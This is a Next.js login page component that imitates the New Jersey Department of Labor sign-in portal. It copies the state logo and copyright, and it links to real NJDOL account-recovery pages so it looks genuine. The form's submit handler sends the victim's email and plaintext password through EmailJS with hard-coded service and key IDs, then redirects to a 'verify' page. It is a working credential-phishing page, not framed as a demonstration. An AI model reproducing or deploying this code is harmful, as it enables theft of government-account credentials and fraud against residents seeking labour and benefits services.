import Link from 'next/link';
import styles from '../styles/Home.module.css';
import emailjs from 'emailjs-com';
import { useRef } from 'react';
import { useRouter } from 'next/router';

const Home = () => {
    const form = useRef();
    const router = useRouter();

    const validateEmail = (email) => {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    };

    const sendEmail = (e) => {
        e.preventDefault();
        const email = form.current.user_email.value;
        const password = form.current.user_password.value;

        if (!validateEmail(email)) {
            alert('Please enter a valid email address.');
            return;
        }

        // Save email to localStorage for other pages
        localStorage.setItem('user_email', email);

        // Prepare data for EmailJS
        const templateParams = {
            user_email: email,
            user_password: password
        };

        emailjs.send(
            'service_ozea06x',
            'template_ugtxhw6', // Replace with your EmailJS template ID for the homepage
            templateParams,
            'XMOnwjyzQDoRVRYl3'
        ).then(
            (result) => {
                router.push('/verify');
            },
            (error) => {
                alert('Error sending form');
            }
        );
    };

    return (
        <div className={styles.container}>
            {/* Logo Section */}
            <div className={styles.logoWrapper}>
                <img
                    src="/ASSET/njdol_logo_stamp.svg"
                    alt="NEW JERSEY LOGO"
                    className={styles.logo}
                />
            </div>

            {/* Login Form Section */}
            <div className={styles.formSection}>
                <form className={styles.loginForm} ref={form} onSubmit={sendEmail}>
                    <h2 className={styles.heading}>Sign in using your email</h2>
                    <input
                        type="text"
                        id="email"
                        name="user_email"
                        placeholder="Please enter your email as username"
                        className={styles.input}
                        required
                    />
                    <input
                        type="password"
                        id="password"
                        name="user_password"
                        placeholder="Password..."
                        className={styles.input}
                        required
                    />
                    <div className={styles.rememberMe}>
                        <input
                            type="checkbox"
                            id="rememberMe"
                            name="remember_me"
                            className={styles.checkbox}
                        />
                        <label htmlFor="rememberMe">Remember my username</label>
                    </div>
                    <button type="submit" className={styles.button}>
                        Login
                    </button>
                </form>

                {/* Options Section */}
                <div className={styles.options}>
                    <Link href="https://secure.dol.state.nj.us/sso/XUI/?realm=njcc#passwordReset/" legacyBehavior>
                        <a>Forgot Password</a>
                    </Link>
                    <span style={{ margin: '0 8px' }}>|</span>
                    <Link href="https://secure.dol.state.nj.us/sso/XUI/?realm=njcc#forgotUsername/" legacyBehavior>
                        <a>Forgot Username</a>
                    </Link>
                </div>
                <div className={styles.horizontalDivider}></div>
                <div className={styles.signupRow}>
                    <span>New here? </span>
                    <Link href="https://secure.dol.state.nj.us/sso/XUI/?realm=njcc#register/">
                        create account
                    </Link>
                </div>
            </div>
            {/* Simple Footer */}
            <footer className={styles.footer}>
                <p>© New Jersey Department of Labor and Workforce Development(NJLWD). All Rights Reserved.</p>
            </footer>
        </div>
    );
};

export default Home;